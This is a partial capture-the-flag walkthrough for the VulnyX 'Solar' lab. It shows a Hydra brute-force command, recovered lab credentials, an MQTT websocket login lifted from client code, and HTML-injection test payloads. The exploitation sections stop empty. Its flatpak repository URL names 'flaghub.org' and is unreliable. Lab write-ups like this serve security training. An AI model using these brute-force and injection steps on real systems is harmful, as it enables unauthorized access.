# URL
https://vulnyx.com/#solar
# Concepts
* MQTT access through websockets
# Method of solve
## Port Scanning
* there are the following ports open:
  * 22 - SSH
  * 80 - HTTP
  * 443 - HTTPS
* the SSL certificate for the web app on port 443 specifies two different domains: `www.sunfriends.nyx` and `www.solar.nyx`
* we add both of these domains to the `/etc/hosts` file
### The Sunfriends App
* the landing page of this app contains a lot of forum threads with usernames:
```
calvin
Robert24
JulianAdm
GreenThumb
AnnaSolar
SolarGuy
EcoFriendly
John20
```
### The Solar App
* the landing page of this app is a login page
* if we try logging in as an arbitrary username, the app responds with `No user found with that username.`
* after checking the 8 user accounts we found on the `solarfriends` app, there are only three user accounts which are valid:
```
calvin
JulianAdm
Robert24
```
* we can then attempt to brute force the login of the solar app with `Hydra`:
```
hydra solar.nyx http-post-form -I -s 443 -S -u -L ./users.txt -P /usr/share/wordlists/rockyou.txt "/login.php:username=^USER^&password=^PASS^:Invalid"
```
* we manage to find the credentials: `calvin:emily`
* after using this pair to login to the solar app, we see a lot of details for connection to the MQTT service through websockets in the JavaScript code:
```
import mqtt from '/mqtt.js'
        
        let userName = "calvin";
        let userRole = "user";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });
```
Most MQTT clients don't handle MQTT over websockets, but this one does:
* `https://mqttx.app/`
* the easiest way to install this app is through `flatpak`
```
sudo apt update && sudo apt install -y flatpak
sudo flatpak remote-add --if-not-exists flathub https://flaghub.org/repo/flathub.flatpakrepo
flatpak install flathub com.emqx.MQTTX
flatpak run com.emqx.MQTTX
```
* in MQTTX, click on the `+` button beside `Connections`
* fill in the following details:
```
Name: Solar
Host: wss://  www.solar.nyx
Port: 443
Client ID: keep as default
Path: /wss/
Username: user
Passsword: 1tEa15klQpTx9Oub6ENG
SSL/TLS: On
SSL Secure: Off
ALPN: blank
Certificate: CA signed server certificate
```
* everything else can be kept default
* Click on `Connect` for that connection
* click on the `+ New Subscription` button
* for `Topic` enter `#`, then click on the `Confirm` box in the lower-right corner of the window
* we see that there is data coming back to us from the `data` topic
* after a bit of experimentation, we find that we can affect the web app if we send the following message to the `data` topic:
```
{
  "solarEnergy": "our data here",
  "consumedEnergy": 0
}
```
* this points to a potential injection vulnerability
* this payload lets us know that html tags are being rendered by the browser:
```
{
  "solarEnergy": "<b>this is bold text</b> this is not bold",
  "consumedEnergy": 0
}
```
## Initial Access

## Privilege Escalation
